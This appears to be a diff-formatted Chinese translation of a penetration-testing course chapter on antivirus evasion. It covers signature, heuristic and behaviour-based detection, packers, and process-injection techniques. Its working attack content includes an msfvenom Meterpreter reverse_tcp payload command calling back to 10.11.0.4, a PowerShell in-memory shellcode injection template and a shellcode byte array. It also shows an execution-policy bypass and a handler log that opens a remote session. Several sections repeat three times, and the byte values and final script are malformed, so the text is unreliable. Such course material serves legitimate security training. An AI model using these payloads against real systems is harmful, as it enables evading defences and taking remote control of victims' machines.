+⁴⁰⁰ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Trivial_File_Transfer_Protocol
+⁴⁰¹ (LOLBAS-Project, 2019), https://github.com/LOLBAS-Project/LOLBAS
+
+### 16.2.5.1 练习
+
+（这些练习不需要报告）
+
+- 1. 使用 VScript 在非交互式 shell 中从 Kali 向 Windows 传输文件。
+- 2. 使用 PowerShell 在非交互式 shell 中从 Kali 向 Windows 传输文件，反之亦然。
+- 3. 对于 Windows 8.1 和 Windows 10 默认提供的 PowerShell 3 及以上版本，增加了 `Invoke-WebRequest`⁴⁰⁰³ 命令。尝试利用它对你的 Kali 机器执行上传和下载请求。
+- 4. 使用 TFTP 在非交互式 shell 中从 Kali 向 Windows 传输文件。
+
+注意：如果遇到问题，首先尝试在交互式 shell 中进行传输过程，并检查可能导致非交互式 shell 出现问题的原因。
+
+### 16.3 总结
+
+在本模块中，我们关注了后渗透阶段的文件传输。我们学习了 FTP 和 TFTP 等传统文件传输方法，并学习了如何升级非交互式 shell。我们还专门关注了使用各种脚本语言的 Windows 特有文件传输方法，以及如何使用 `exe2hex` 工具传输文件。
+
+在评估过程中，我们可以以多种方式使用这些方法，帮助将工具或数据传输到目标网络内部或外部。
+
+> ⁴⁰² (apiocracle, 2018), https://github.com/apiocracle/LOLBAS/blob/master/OSBinaries/Certutil md
+> ⁴⁰⁰³ (Microsoft, 2019), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-6
+
+## 17. 杀毒软件绕过
+
+在尝试入侵目标时，攻击者经常会禁用或绕过安装在这些系统上的杀毒软件。作为渗透测试人员，我们必须理解并能够模拟这些技术，以展示这种潜在威胁。
+
+在本模块中，我们将讨论杀毒软件的用途，并概述它们在大多数公司中的部署方式。我们将检查用于检测恶意软件的各种方法，并探索一些可用工具，允许我们绕过目标机器上的杀毒软件。
+
+### 17.1 什么是杀毒软件
+
+杀毒软件（AV）是一种旨在防止、检测和删除恶意软件的应用程序。它最初的设计是为了删除计算机病毒。然而，随着其他类型恶意软件的发展，杀毒软件通常包含了额外的保护措施，如防火墙、网站扫描程序等。
+
+### 17.2 检测恶意代码的方法
+
+为了演示各种杀毒产品的的有效性，我们将从扫描一个流行的 Meterpreter 负载开始。使用 `msfvenom`，我们将生成一个标准的的可执行文件（PE）。PE 格式用于 Windows 操作系统，包含了 Windows 加载器执行代码所需的库、导入和导出信息。
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 PORT=4444 -f exe.exe
+
+No platform was selected, choosing Msf::Module:Windows
+
+No encoder specified, outputting raw payload
+
+Payload size: 333 bytes
+
+Final size of exe: 73802
+```
+
+
+
+病毒签名是恶意软件内部的连续字节序列，用于唯一标识它。基于签名的杀毒检测被视为黑名单技术。换句话说，对文件进行恶意软件签名扫描，如果发现，恶意文件将被隔离。这意味着，通过正确的工具，我们可以轻松地绕过依赖这种检测方法的杀毒软件。具体而言，我们可以通过混淆或更改已知恶意文件的内容来破坏标识序列（或签名）。
+
+接下来，我们将对该执行文件运行病毒扫描。与其在本地机器上安装大量杀毒应用，我们可以将文件上传到 VirusTotal⁴⁰⁷，它将扫描文件以确定 AV 的检测率。
+
+> VirusTotal 非常方便，但它会为每个唯一的提交生成哈希值并与所有 AV 供应商共享。因此，提交敏感负载时要小心，因为哈希值从首次提交起就是公开的。
+
+扫描结果如下：
+
+| Ad-Aware | Community | Anti-Lab-V | |
+| --- | --- | --- | --- |
+| | | Trojan.Cryp.Gen | | Trojan.Cryp.Gen |
+| ALYac | Win32Patch[Wn] | | Win32Patch[Wn] |
+| Avast | | Trojan.CRPC.Gen | is |
+| Astra | | | Trojan.Swort.B(i) |
+| Baidu | Win32.Trojan.Eyes160570 | BitDefender | |
+| Bikar | | Win12!Fart.Gen | CAT-Quarantine | |
+| ClamAV | Win32.Swort.Rozen.A | Comodo | Trojan.Swort.Rozen.A |
+| CrowdStrike | | malicious_exe;106(0) | Cybersec | malicious_exe;67 |
+| Cyance | | | Symantec | Win32.Swort.Gen.EdA |
+
+图26 meterpreter 负载的 VirusTotal 结果。
+
+![](img/f9f528ca9845f4c256ce54e82b1345_490.png)
+
+⁴⁰⁷ (VirusTotal, 2019), https://www.virustotal.com/#home/upload
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. All rights reserved.
+
+491
+
+使用 Kali Linux 2.0 进行渗透测试
+
+根据所测试杀毒软件的类型和质量，有时我们通过简单地将二进制文件内部几个无害的字符串从小写改为大写，就可以绕过杀毒软件。然而，并非每种情况都是如此。
+
+由于杀毒软件使用不同的签名和专利技术来检测恶意软件，且每个供应商都会不断更新其数据库，通常很难得出一个通用的杀毒软件规避解决方案。很多情况下，这个过程是基于测试环境中的尝试法。
+
+因此，在进行渗透测试期间，在考虑绕过策略之前，我们应该识别已部署的杀毒软件的存在性、类型和版本。如果客户端网络或系统实施了杀毒软件，在将文件上传到目标机器之前，我们应该收集尽可能的信息，并在实验室环境中复制该配置，以进行 AV 绕过测试。
+
+## 17.2.2 启发式和基于行为的检测
+
+为了解决基于签名检测的缺陷，杀毒厂商引入了额外的检测方法来提高其产品的有效性。
+
+启发式检测^408 是一种依赖各种规则和算法来确定某个操作是否被视为恶意的检测方法。这通常通过逐步执行二进制文件的指令或通过尝试分解和分析源代码来实现。其核心思想是寻找被认为恶意的各种模式和程序调用（而不是简单的序列）。
+
+或者，基于行为的检测^409 动态分析二进制文件的行为。这通常通过在仿真环境（如虚拟机）中执行该文件，并寻找被视为恶意的行为或操作来实现。
+
+由于这些技术不需要恶意软件签名，因此可以更有效地识别未知的恶意软件或已知恶意软件的变体。鉴于杀毒厂商在启发式和行为检测方面使用了不同的实现方式，杀毒软件产品在哪些代码被视为恶意方面会有所不同。
+
+值得注意的是，大多数杀毒软件开发者使用这些检测方法的组合来获得更高的检测率。
+
+### 17.3 绕过杀毒检测
+
+通而言之，杀毒规避分为两类：磁盘内和内存中。磁盘规避侧重于修改物理存储在磁盘上的恶意软件文件，试图规避 AV 检测。鉴于 AV 文件扫描的成熟，现代恶意软件通常尝试内存中操作，完全不操作磁盘，从而减少被检测的可能性。在接下来的章节中，我们将对这两种方法中使用的技术进行进行概述。请注意，关于这些技术的内容在本模块的范围。
+
+^408 (Wikipedia, 2019), https://en.wikipedia.org/wiki/Heuristic_analysis
+^409 (Tristan Aubrey-Jones, 2007), https://pdfs.semanticscholar.org/08ec/2410e9218c3a65bc3e16dd88dea269393.pdf
+
+## 17.3.1 磁盘内规避
+
+在讨论规避之前，我们将首先查看混淆存储在物理磁盘上的文件的各种技术。
+
+### 17.3.1.1 加壳 (Packers)
+
+现代磁盘恶意软件混淆有许多形式。早期避免检测的方法之一是使用加壳¹⁰。考虑到互联网早期磁盘空间昂贵且网络缓慢，加壳最初的设计是为了缩小可执行文件的大小。与现代“zip”压缩技术不同，加壳生成的可执行文件不仅更小，而且功能上与全新的结构等效。生成的文件具有签名，因此可以有效绕过较旧且更简单的 AV 扫描器。即使某些现代恶意软件使用了这种技术的变体，使用 `UPX`¹¹ 和其他流行的加壳工具也不足以规避现代 AV 扫描器。
+
+### 17.3.1.2 混淆器 (Obfuscators)
+
+混淆器重新组织并变异代码，使其更难逆向工程。这包括将指令替换为语义等价的指令，插入无关指令或重排列函数，以保护知识产权。
+
+### 17.3.1.3 加密器 (Cryptors)
+
+加密器通过加密方式修改可执行文件，在执行时在内存中还原原始代码，在磁盘上留下加密代码。这在现代恶意软件中成为基础。
+
+### 17.3.1.4 软件保护 (Software Protectors)
+
+高度有效的杀毒规避是上述技术的组合，包括反调试、虚拟机仿真等。许多这些技术在层面上看起来很简单，但实际上非常复杂。由于这种性，目前很少有活跃维护的工具。
+
+¹⁰ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Executable_compression
+¹¹ (UPX, 2018), https://upx.github.io/
+¹² (Wikipedia, 2019), https://en.wikipedia.org/wiki/Dead_code
+
+## 17.3.2 内存中规避
+
+内存注入（也称为 PE 注入）是一种用于绕过杀毒的流行技术。与其混淆二进制文件，它转向易失性内存。这种技术的主要优点之一是不写入磁盘。在本模块中，我们将对其中一些技术进行简要说明。
+
+### 17.3.2.1 远程进程注入 (Remote Process Injection)
+
+该技术旨在将负载注入另一个进程。实现此常用的方法是利用一组 Windows API¹⁶。首先，我们使用 `OpenProcess`¹⁷ 获取具有权限的目标进程句柄¹⁸。获取句柄后，我们通过调用 Windows `VirtualAlloc`¹⁹ 在其分配内存。一旦在远程进程分配了内存，我们使用 `WriteProcessMemory`⁰ 拷贝恶意负载。复制完成后，通常使用 `CreateThread`²¹ 在独立线程中执行。这听起来很复杂，但我们将在示例中使用 PowerShell 对本地 `powershell.exe` 实例进行非常简化的攻击。
+
+¹² (Enigma Protector, 2019), http://www.enigmaprotector.com/en/home
+¹³ (Endgame, 2017), https://www.endgame.com/blog/technical-blog/process-injection-techniques-survey-common-and-trending
+¹⁴ (F-Secure, 2018), https://blog.f-secure.com/memory-injection-like-a-boss
+¹⁵ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Windows_API
+¹⁶ (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/processthreadapi/processthreadapi-open-process
+¹⁷ (Microsoft, 2019), https://docs.microsoft.com/en-us/win32/api/open-process
+¹⁸ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Handle
+¹⁹ (Microsoft, 2019), https://docs.microsoft.com/en-us/windows/win32/api/virtualallocex
+²⁰ (Microsoft, 2019), https://docs.microsoft.com/en-us/win32/api/writeprocessmemory
+²¹ (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/api/createremotread-nprocessthreadapi-createremotread
+
+## 17.3.2.2 反射型 DLL 注入 (Reflective DLL Injection)
+
+普通的 DLL 注入意味着使用 `LoadLibrary` API 从磁盘加载恶意 DLL，与之不同，该技术尝试加载由攻击者存储在进程内存中的 DLL。
+
+实现此技术的主要挑战是 `LoadLibrary` 不支持从内存加载 DLL。此外，Windows 操作系统没有提供处理此问题的 API。选择使用这种技术的攻击者必须编写自己的 API 版本，且不运行基于磁盘的 DLL。
+
+## 17.3.2.3 进程镂空 (Process Hollowing)
+
+当使用进程镂空时，攻击者首先启动一个处于挂起状态的非恶意进程。启动后，移除该进程的映像并将其替换为恶意可执行文件。最后，恢复进程运行并在合法进程内执行恶意代码。
+
+## 17.3.2.4 内联钩子 (Inline Hooking)
+
+顾如其名，该技术涉及修改内存并在函数中引入钩子（重定向执行代码的指令），以将执行流指向我们的恶意代码。执行我们的恶意代码后，执行流将返回到修改后的函数并继续执行，就好像只有原始代码执行过一样。
+
+## 17.3.3 杀毒软件规避：实例演示
+
+现在我们已经对杀毒软件使用的检测技术和相应的绕过方法有了通用理解，可以将其转化为实际实例。
+
+找到一个绕过所有杀毒软件的通用解决方案是困难且耗时的，甚至是不可能的。考虑到典型渗透测试中的时间限制，针对客户端网络部署的特定杀毒软件要高效得多。
+
+为了本模块，我们将在 Windows 10 客户端上安装 Avira Free Antivirus Version 15.0.34。Avira 安装程序可以在 `C:\Tools\antivirus_evasion\` 目录下找到。安装后，我们可以在 Windows 10 搜索栏中搜索“Start Avira Antivirus”来检查其配置。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_494_0.png)
+
+图 264：在搜索栏中搜索 Start Avira Antivirus。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_495_0.png)
+
+启动此应用程序将显示 Avira 控制中心，我们可以在此处验证*实时保护* (Real-Time Protection) 功能是否启用，如果没有，我们可以手动启用：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_495_1.png)
+
+图 265：Avira 控制中心。
+
+第一步，我们应该验证杀毒软件是否按预期工作。我们将使用之前生成的 meterpreter 负载并用 Avira对其进行扫描。
+
+PWK 2.0 版权 © Offensive Security Ltd. 版权所有。496
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+在将恶意 PE 文件传输到我们的 Windows 客户端后，我们将尝试运行该二进制文件并观察结果。
+
+
+
+`C:\Users\offsec\Desktop>` `dir`
+
+```
+Volume in drive C has no label.
+
+Volume Serial Number is 56B9-B874
+
+Directory of C:\Users\offsec\Desktop
+
+02/26/2018 10:20 AM  <DIR>
+02/26/2018 10:20 AM  <DIR>
+02/26/2018 06:16 AM                 73,862 binary.exe
+02/26/2018 05:55 AM                 799 Windows 10 Update Assistant.lnk
+                                     75,647 bytes
+                             3 File(s)
+                             3 Dir(s)                4,521,566,288 bytes free
+```
+
+`C:\Users\offsec\Desktop>` `binary.exe`
+
+```
+The system cannot execute the specified program.
+```
+
+列表 497 - Avira 正在阻止恶意 PE 的执行。
+
+在这种情况下，我们看到了一个错误消息，指示系统无法执行该文件。紧接着，Avira 弹出一个通知，告知我们该文件已被标记为恶意并已隔离。
+
+![](img/f99f528ca9845f4c256ce54e82b1345_496_0.png)
+
+图 266：Avira 弹窗。
+
+### 17.3.3.1 PowerShell 内存注入
+
+根据我们的目标环境及其受限程度，我们可能可以通过 PowerShell 的帮助绕过杀毒软件。在下面的示例中，我们将使用一种类似于远程进程内存注入的技术。主要区别在于我们将针对当前正在执行的进程，在我们的案例中这将解释器。
+
+PowerShell 的一个非常强大的特性是它与 Windows API 交互的能力。这允许我们实现内存注入。将脚本作为 PE 执行的主要益处之一是，杀毒软件制造商很难判断脚本是否为恶意。在下面的列表中，我们提供了一个执行内存注入的基础模板：
+
+```powershell
+$code = '
+[DllImport("kernel32")]
+public static IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32")]
+public static IntPtr CreateThread(IntPtr lpThread, IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("msvcrt")]
+public static int memset(IntPtr dest, IntPtr src, uint count);'
+$win32 = Add-Type -MemberDefinition $code -Name "Win32" -PassThru
+$sc = <byte[]>;
+$size = 0x100;
+if ($sc.length -gt 0x100) {
+    $x = $win32::VirtualAlloc([IntPtr]::Zero, [UIntPtr]$size, 0x3000, 0x40);
+    for ($i=0; $i -le $sc.length; $i++) {
+        $win32::memset([IntPtr]$x, [IntPtr]$sc[$i], 1);
+    }
+    $win32::CreateThread([IntPtr]::Zero, [IntPtr]::Zero, $x, [IntPtr]::Zero, 0, [IntPtr]::Zero);
+}
+```
+
+列表 498 - PowerShell 内存注入
+
+
+
+## 17.3.2.2 反射型 DLL 注入 (Reflective DLL Injection)
+
+普通的 DLL 注入意味着使用 `LoadLibrary` API 从磁盘加载恶意 DLL，与之不同，该技术尝试加载由攻击者存储在进程内存中的 DLL。
+
+## 17.3.2.3 进程镂空 (Process Hollowing)
+
+当使用进程镂空时，攻击者首先启动一个处于挂起状态的非恶意进程。启动后，移除该进程的映像并将其替换为恶意可执行文件。最后，恢复进程运行并在合法进程内执行恶意代码。
+
+## 17.3.2.4 内联钩子 (Inline Hooking)
+
+顾如其名，该技术涉及修改内存并在函数中引入钩子（重定向执行代码的指令），以将执行流指向我们的恶意代码。执行我们的恶意代码后，执行流将返回到修改后的函数并继续执行，就好像只有原始代码执行过一样。
+
+## 17.3.3 杀毒软件规避：实例演示
+
+现在我们已经对杀毒软件使用的检测技术和相应的绕过方法有了通用理解，可以将其转化为实际实例。
+
+找到一个绕过所有杀毒软件的通用解决方案是困难且耗时的，甚至是不可能的。考虑到典型渗透测试中的时间限制，针对客户端网络部署的特定杀毒软件要高效得多。
+
+为了本模块，我们将在 Windows 10 客户端上安装 Avira Free Antivirus Version 15.0.34。Avira 安装程序可以在 `C:\Tools\antivirus_evasion\` 目录下找到。安装后，我们可以在 Windows 10 搜索栏中搜索“Start Avira Antivirus”来检查其配置。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_494_0.png)
+
+图 264：在搜索栏中搜索 Start Avira Antivirus。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_495_0.png)
+
+启动此应用程序将显示 Avira 控制中心，我们可以在此处验证 `Real-Time Protection` 功能是否启用，如果没有，我们可以手动启用：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_495_1.png)
+
+图 265：Avira 控制中心。
+
+第一步，我们应该验证杀毒软件是否按预期工作。我们将使用之前生成的 meterpreter 负载并用 Avira 对进行扫描。
+
+PWK 2.0 版权 © Offensive Security Ltd. 版权所有。496
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+在将恶意 PE 文件传输到我们的 Windows 客户端后，我们将尝试运行该二进制文件并观察结果。
+
+```
+C:\Users\offsec\Desktop> dir
+
+Volume in drive C has no label.
+
+Volume Serial Number is 56B9-B874
+```
+
+```
+Directory of C:\Users\offsec\Desktop
+
+02/26/2018 10:20 AM  <DIR>
+02/26/2018 10:20 AM  <DIR>
+02/26/2018 06:16 AM                 73,862 binary.exe
+02/26/2018 05:55 AM                 799 Windows 10 Update Assistant.lnk
+                                     75,647 bytes
+                             3 File(s)
+                             3 Dir(s)                4,521,566,288 bytes free
+```
+
+```
+C:\Users\offsec\Desktop> binary.exe
+
+The system cannot execute the specified program.
+```
+
+列表 497 - Avira 正在阻止恶意 PE 的执行。
+
+在这种情况下，我们看到了一个错误消息，指示系统无法执行该文件。紧接着，Avira 弹出一个通知，告知我们该文件已被标记为恶意并已隔离。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_496_0.png)
+
+图 266：Avira 弹窗。
+
+## 17.3.3.1 PowerShell 内存注入
+
+根据我们的目标环境及其受限程度，我们可能可以通过 PowerShell 的帮助绕过杀毒软件。在下面的示例中，我们将使用一种类似于远程进程内存注入的技术。主要区别在于我们将针对当前正在执行的进程，在我们的案例中这将解释器。
+
+PowerShell 的一个非常强大的特性是它与 Windows API 交互的能力。这允许我们实现内存注入。将脚本作为 PE 执行的主要益处之一是，杀毒软件制造商很难判断脚本是否为恶意。在下面的列表中，我们提供了一个执行内存注入的基础模板：
+
+```powershell
+$code = '
+[DllImport("kernel32")]
+public static IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32")]
+public static IntPtr CreateThread(IntPtr lpThread, IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("msvcrt")]
+public static int memset(IntPtr dest, IntPtr src, uint count);'
+
+$win32 = Add-Type -MemberDefinition $code -Name "Win32" -PassThru
+$sc = <byte[]>;
+$size = 0x100;
+if ($sc.length -gt 0x100) {
+    $x = $win32::VirtualAlloc([IntPtr]::Zero, [UIntPtr]$size, 0x3000, 0x40);
+    for ($i=0; $i -le $sc.length; $i++) {
+        $win32::memset([IntPtr]$x, [IntPtr]$sc[$i], 1);
+    }
+    $win32::CreateThread([IntPtr]::Zero, [IntPtr]::Zero, $x, [IntPtr]::Zero, 0, [IntPtr]::Zero);
+}
+```
+
+
+
+## 17.3.2.2 反射型 DLL 注入 (Reflective DLL Injection)
+
+普通的 DLL 注入意味着使用 `LoadLibrary` API 从磁盘加载恶意 DLL，与之不同，该技术尝试加载由攻击者存储在进程内存中的 DLL。
+
+## 17.3.2.3 进程镂空 (Process Hollowing)
+
+当使用进程镂空时，攻击者首先启动一个处于挂起状态的非恶意进程。启动后，移除该进程的映像并将其替换为恶意可执行文件。最后，恢复进程运行并在合法进程内执行恶意代码。
+
+## 17.3.2.4 内联钩子 (Inline Hooking)
+
+顾如其名，该技术涉及修改内存并在函数中引入钩子（重定向执行代码的指令），以将执行流指向我们的恶意代码。执行我们的恶意代码后，执行流将返回到修改后的函数并继续执行，就好像只有原始代码执行过一样。
+
+## 17.3.3 杀毒软件规避：实例演示
+
+现在我们已经对杀毒软件使用的检测技术和相应的绕过方法有了通用理解，可以将其转化为实际实例。
+
+找到一个绕过所有杀毒软件的通用解决方案是困难且耗时的，甚至是不可能的。考虑到典型渗透测试中的时间限制，针对客户端网络部署的特定杀毒软件要高效得多。
+
+为了本模块，我们将在 Windows 10 客户端上安装 Avira Free Antivirus Version 15.0.34。Avira 安装程序可以在 `C:\Tools\antivirus_evasion\` 目录下找到。安装后，我们可以在 Windows 10 搜索栏中搜索“Start Avira Antivirus”来检查其配置。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_494_0.png)
+
+图 264：在搜索栏中搜索 Start Avira Antivirus。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+![](img/f99f528ca9845f4c256ce54e882b1345_495_0.png)
+
+启动此应用程序将显示 Avira 控制中心，我们可以在此处验证 `Real-Time Protection` 功能是否启用，如果没有，我们可以手动启用：
+
+![](img/f99f528ca9845f4c256ce54e882b1345_495_1.png)
+
+图 265：Avira 控制中心。
+
+第一步，我们应该验证杀毒软件是否按预期工作。我们将使用之前生成的 meterpreter 负载并用 Avira 对进行扫描。
+
+PWK 2.0 版权 © Offensive Security Ltd. 版权所有。496
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+在将恶意 PE 文件传输到我们的 Windows 客户端后，我们将尝试运行该二进制文件并观察结果。
+
+```
+C:\Users\offsec\Desktop> dir
+
+Volume in drive C has no label.
+
+Volume Serial Number is 56B9-B874
+```
+
+```
+Directory of C:\Users\offsec\Desktop
+
+02/26/2018 10:20 AM  <DIR>
+02/26/2018 10:20 AM  <DIR>
+02/26/2018 06:16 AM                 73,862 binary.exe
+02/26/2018 05:55 AM                 799 Windows 10 Update Assistant.lnk
+                                     75,647 bytes
+                             3 File(s)
+                             3 Dir(s)                4,521,566,288 bytes free
+```
+
+```
+C:\Users\offsec\Desktop> binary.exe
+
+The system cannot execute the specified program.
+```
+
+列表 497 - Avira 正在阻止恶意 PE 的执行。
+
+在这种情况下，我们看到了一个错误消息，指示系统无法执行该文件。紧接着，Avira 弹出一个通知，告知我们该文件已被标记为恶意并已隔离。
+
+![](img/f99f528ca9845f4c256ce54e882b1345_496_0.png)
+
+图 266：Avira 弹窗。
+
+## 17.3.3.1 PowerShell 内存注入
+
+根据我们的目标环境及其受限程度，我们可能可以通过 PowerShell 的帮助绕过杀毒软件。在下面的示例中，我们将使用一种类似于远程进程内存注入的技术。主要区别在于我们将针对当前正在执行的进程，在我们的案例中这将解释器。
+
+PowerShell 的一个非常强大的特性是它与 Windows API 交互的能力。这允许我们实现内存注入。将脚本作为 PE 执行的主要益处之一是，杀毒软件制造商很难判断脚本是否为恶意。在下面的列表中，我们提供了一个执行内存注入的基础模板：
+
+```powershell
+$code = '
+[DllImport("kernel32")]
+public static IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32")]
+public static IntPtr CreateThread(IntPtr lpThread, IntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("msvcrt")]
+public static int memset(IntPtr dest, IntPtr src, uint count);'
+$win32 = Add-Type -MemberDefinition $code -Name "Win32" -PassThru
+$sc = <byte[]>;
+$size = 0x100;
+if ($sc.length -gt 0x100) {
+    $x = $win32::VirtualAlloc([IntPtr]::Zero, [UIntPtr]$size, 0x3000, 0x40);
+    for ($i=0; $i -le $sc.length; $i++) {
+        $win32::memset([IntPtr]$x, [IntPtr]$sc[$i], 1);
+    }
+    $win32::CreateThread([IntPtr]::Zero, [IntPtr]::Zero, $x, [IntPtr]::Zero, 0, [IntPtr]::Zero);
+}
+```
+
+
+
+# 攻击性安全
+
+```
+0x4a,0x3c,0xb8,0x4c,0x11,0x70,0x48,0xd1,0x55,0x8b,0x59,0xff,0x29,0xd0,0x63,0xb4
+0x18,0xb9,0x3a,0x49,0x58,0x34,0x5b,0x7f,0x8a,0xc1,0xc2f,0xff,0x04,0xd,0x01,0xc7
+0x38,0xe0,0x75,0x65,0x7d,0x78,0x74,0x24,0x45,0x56,0x5b,0x24,0x61,0xd3,
+0x6a,0x6b,0x0d,0xe1,0x67,0x5b,0x58,0x4c,0xb1,0xd4,0x48,0x5b,0xd1,0x44,0xb8,0x64
+0x6b,0x0d,0xb4,0x61,0x59,0x51,0x55,0xe0,0xff,0x05,0x47,0x5a,0x12,0xd8,0x15,0x58
+0x33
+0x32,0xe0,0x68,0x77,0x73,0x82,0x54,0x68,0x4c,0x47,0x27,0x76,0xff,0x27,0x55,0x8d,0x55
+0xd8,0x91,0x90,0x86,0x74,0x55,0x59,0x54,0x68,0x8b,0xff,0x65,0xd5,0x6a,0x68,0x60
+0x0a,0x14,0x78,0x84,0x55,0x66,0x82,0x02,0x11,0x65,0x69,0x5e,0x50,0x50,0x50,0x40
+0x58,0x6a,0xe7,0x8f,0xd2,0x68,0x97,0x5a,0x59,0x57,0x56,0xd8,0x21,0xf8,0x53,0xd8
+0x54,0x65,0xd8,0xe6,0xa4,0x57,0x56,0xd8,0x62,0x67,0x51,0xd8,0x53,0x88,0x83,0x76
+0x36,0x6a,0xb0,0x48,0x68,0x10,0x10,0xe0,0x56,0x6a,0x68,0x58,0x54,0x5a,0xe5,0xff
+0x05,00x93,0xa4,0xb8,0x56,0x65,0x62,0xd8,0xe9,0x68,0xd8,0xf1,0xd8,0x83,0xb8,0xd8,0x70
+0x22,0x58,0x68,0x7d,0xa4,0x40,0x76,0x68,0xb8,0x6f,0xb8,0xff,0x30,0xe5,0x05,0x57,0xd6
+0x75,0xe6,0x74,0xd61,0x47,0xff,0x01,0xe5,0x5e,0x24,0x9a,0x71,0xff,0x01,0x03
+0xc29,0x66,0x75,0x77,0xc3,0xb8,0xff,0x85,0x52,0x56,0x6a,0x53
+```
+产生的输出可以使用 `svbuf` 变量复制到最终脚本
+
+```
+[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwSize, IntPtr lpStartAddress, IntPtr dwFlags, out IntPtr lpId);DllImport("kernel32.dll")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nToWrite, out int lpNumberOfWritten);$winFunc = Add-Type -Name "Win32" -namespace Win32 -PassThru
+$winFunc = Add-Type -Name "Win32" -namespace Win32 -PassThru
+$winFunc = 0x7a,0xce,0x82,0xe0,0x58,0x00,0x00,0x89,0xe5,0x31,0xc0,0x64,0xb8,0x50,0x30,0xb8,0x52,0xe6,0x7b,0x52,0x54,0xa7,0x72,0x28,0x67,0x5a,0x26,0x31,0xff,0xac,0x3c,0x3a,0x67,0x7c,0xe0,0x22,0xc1,0x8f,0x0d,0xc1,0xc4,0xe2,0x52,0x57,0x5b,0x52,0xd8,0x10,0x8b,0xc3,0xa3,0xb8,0x44,0xb1,0x78,0x87,0x81,0x48,0x5b,0xd8,0x59,0x29,0x64,0x54,0x73,0x18,0xb9,0x3a,0x49,0x58,0x34,0x5b,0x7f,0x8a,0xc1,0xc2f,0xff,0x04,0xd,0x01,0xc7,0x38,0xe0,0x75,0x65,0x7d,0x78,0x74,0x24,0x45,0x56,0x5b,0x24,0x61,0xd3,0x6a,0x6b,0x0d,0xe1,0x67,0x5b,0x58,0x4c,0xb1,0xd4,0x48,0x5b,0xd1,0x44,0xb8,0x64,0x6b,0x0d,0xb4,0x61,0x59,0x51,0x55,0xe0,0xff,0x05,0x47,0x5a,0x12,0xd8,0x15,0x58,0x33
+$size = 0x1000;
+if ($sc.Length-gt 0x1000) ($size = $sc.Length);
+$x = $winFunc.VirtualAlloc(0,$size,0x3000,0x40);
+for ($i=0;$i -le ($sc.Length-1);$i++) { $winFunc.memset([IntPtr]$x, $sc[$i], 1); }
+$asthr = $winFunc.CreateThread(0,0,$x,0,out $asthr);
+Start-sleep 60
+```
+
+# 攻击性安全
+
+## 使用 Kali Linux 进行渗透测试 2.0
+
+请记住，在 Windows 中，PowerShell 执行策略可能由一个或多个 Active Directory GPO 决定。在这种情况下，可能需要寻找额外的绕过向量。
+
+尝试查看并更改当前用户的策略。请注意，在此例中，我们选择更改策略而不是逐脚本绕过，这可以通过运行每个脚本时使用 `-ExecutionPolicy Bypass` 参数来实现。
+
+```
+C:\Users\offsec\Desktop> powershell
+PowerShell
+Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+```
+
+```
+PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser Undefined
+PS C:\Users\offsec\Desktop> Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+```
+
+```
+PS C:\Users\offsec\Desktop> Get-ExecutionPolicy -Scope CurrentUser Unrestricted
+```
+
+上面的列表显示已成功将当前用户的策略更改 unrestricted。在执行脚本之前，将在 Kali 机器上启动一个 meterpreter 处理器与其交互：
+
+> 列表 505 - 更改当前用户的 ExecutionPolicy
+
+```
+msf exploit(multi/handler) > show options
+Module options (exploit/multi/handler):
+| Name | Current Setting | Required Description |
+| :--- | :--- | :--- |
+
+Payload options (windows/meterpreter/reverse_tcp):
+| Name | Current Setting | Required Description |
+| :--- | :--- | :--- |
+| EXITFUNC | process | yes | Exit technique (Accepted) |
+```
+
+msf exploit(multi/handler) > exploit
+
+[*] Starting reverse handler on 10.11.0.4:4444
+
+[*] Waiting for connection from 10.11.0.5:4444 ...
+
+
+
+[*] Handler established, 10.11.0.4:4444 -> 10.11.0.5:4446
+
+[*] Session 1 opened
+
+```
+C:\Users\offsec\Desktop> .av_test.ps1
+C:\Users\offsec\Desktop> dir
+Volume in drive C has no label.
+Volume Serial Number is 56B9-BB74
+
+Directory of C:\Users\offsec\Desktop
+
+```02/27/2018 05:16 AM <DIR>
+
+02/27/2018 05:16 AM <DIR>
+
+02/27/2018 05:09 AM av_test.ps1
+
